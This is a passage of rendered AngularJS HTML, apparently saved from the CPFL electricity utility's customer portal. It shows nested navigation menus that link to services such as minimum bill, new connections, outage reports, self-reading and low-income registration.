                                                                                    class="ng-scope ng-binding">Débito
                                                                                    automático</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/conta-minima"
                                                                                ui-sref="app.conta-minima"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Conta
                                                                                    mínima</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/migracao-tarifaria-informativo"
                                                                                ui-sref="app.migracao-tarifaria-informativo"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Tarifa
                                                                                    Branca</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/micro-mini-geracao-relatorio"
                                                                                ui-sref="app.micro-mini-geracao-relatorio"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Micro/Mini
                                                                                    Geração - Histórico de Saldo</span>
                                                                            </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                                    </ul>
                                                                </div><!-- end ngIf: item.items.length > 0 -->
                                                            </li>
                                                            <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                            <!-- end ngRepeat: item in ::items -->
                                                            <!-- ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                            <div ng-if="items[0].classItem !== &#39;sub-item-menu&#39;"
                                                                class="col-md-8 text-left text-align-middle ng-scope ng-binding"
                                                                translate=""
                                                                style="margin: 0em; position: absolute; top: 50%; left: 75%; margin - right: -50%; transform: translate(-50%, -50%); ">
                                                            </div>
                                                            <!-- end ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                        </ul>
                                                    </li>
                                                    <!-- end ngIf: menuCtrl.itemsMenuLoaded && menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                                                    <!-- ngIf: menuCtrl.itemsMenuLoaded &&
                                                                  menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                                                    <li class="dropdown mega-dropdown ng-scope"
                                                        ng-if="menuCtrl.itemsMenuLoaded &amp;&amp;
                                                                  menuCtrl.getClientId() != &#39;agencia-virtual-cpfl-credenciados&#39;"><a
                                                            class="dropdown-toggle ng-scope" data-toggle="dropdown"
                                                            translate="@APP-COMMON-MENU-MINHA-INSTALACAO">Minha
                                                            energia</a>
                                                        <ul class="site-menu dropdown-menu mega-dropdown-menu multi-level col-md-20 ng-isolate-scope"
                                                            suffix=" " flag="" name="menuMinhaEnergia" legend="">
                                                            <!-- ngRepeat: item in ::items -->
                                                            <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                            <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                ng-mouseover="emitEvent(item);"
                                                                ng-mouseleave="eventHidetooltip();"
                                                                ng-repeat="item in ::items"
                                                                ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                class="ng-scope col-md-16 border-right">
                                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                <!-- ngIf: item.items.length > 0 -->
                                                                <div ng-if="item.items.length &gt; 0" class="ng-scope">
                                                                    <ul class="col-md-20 ng-isolate-scope" suffix=" "
                                                                        flag="" items="item.items">
                                                                        <!-- ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/ligacao-nova"
                                                                                ui-sref="app.ligacao-nova"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Nova
                                                                                    ligação</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/falta-energia"
                                                                                ui-sref="app.falta-de-energia"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Falta de
                                                                                    energia</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/religacao-energia"
                                                                                ui-sref="app.religacao-energia"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Religar
                                                                                    energia</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/desligar-energia"
                                                                                ui-sref="app.desligar-energia"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Desligar
                                                                                    energia</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/envio-documentos"
                                                                                ui-sref="app.envio-documentos"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Envio
                                                                                    Documentos</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/desligamento-programado"
                                                                                ui-sref="app.desligamento-programado"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Desligamento
                                                                                    programado</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/reformar-padrao-entrada"
                                                                                ui-sref="app.reformar-padrao-entrada"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Reformar
                                                                                    o meu poste padrão</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/alteracao-carga"
                                                                                ui-sref="app.alteracao-carga"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Alteração
                                                                                    de carga</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/auto-leitura"
                                                                                ui-sref="app.auto-leitura"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Autoleitura</span>
                                                                            </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                                    </ul>
                                                                </div><!-- end ngIf: item.items.length > 0 -->
                                                            </li>
                                                            <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                            <!-- end ngRepeat: item in ::items -->
                                                            <!-- ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                            <div ng-if="items[0].classItem !== &#39;sub-item-menu&#39;"
                                                                class="col-md-8 text-left text-align-middle ng-scope ng-binding"
                                                                translate=""
                                                                style="margin: 0em; position: absolute; top: 50%; left: 75%; margin - right: -50%; transform: translate(-50%, -50%); ">
                                                            </div>
                                                            <!-- end ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                        </ul>
                                                    </li>
                                                    <!-- end ngIf: menuCtrl.itemsMenuLoaded &&
                                                                  menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                                                    <!-- ngIf: menuCtrl.itemsMenuLoaded &&
                                                                  menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                                                    <li class="dropdown mega-dropdown ng-scope"
                                                        ng-if="menuCtrl.itemsMenuLoaded &amp;&amp;
                                                                  menuCtrl.getClientId() != &#39;agencia-virtual-cpfl-credenciados&#39;"><a
                                                            class="dropdown-toggle ng-scope" data-toggle="dropdown"
                                                            translate="@APP-COMMON-MENU-MEU-CADASTRO">Meu cadastro</a>
                                                        <ul class="site-menu dropdown-menu mega-dropdown-menu multi-level col-md-20 ng-isolate-scope"
                                                            suffix=" " flag="" name="menuMeuCadastro" legend="">
                                                            <!-- ngRepeat: item in ::items -->
                                                            <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                            <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                ng-mouseover="emitEvent(item);"
                                                                ng-mouseleave="eventHidetooltip();"
                                                                ng-repeat="item in ::items"
                                                                ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                class="ng-scope col-md-16 border-right">
                                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                <!-- ngIf: item.items.length > 0 -->
                                                                <div ng-if="item.items.length &gt; 0" class="ng-scope">
                                                                    <ul class="col-md-20 ng-isolate-scope" suffix=" "
                                                                        flag="" items="item.items">
                                                                        <!-- ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/meus-dados"
                                                                                ui-sref="app.meus-dados" ui-sref-opts=""
                                                                                class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Atualizar
                                                                                    cadastro</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/consulta-solicitacao"
                                                                                ui-sref="app.consulta-solicitacao"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Meus
                                                                                    pedidos</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/baixa-renda"
                                                                                ui-sref="app.baixa-renda"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Cadastro
                                                                                    de Baixa Renda</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
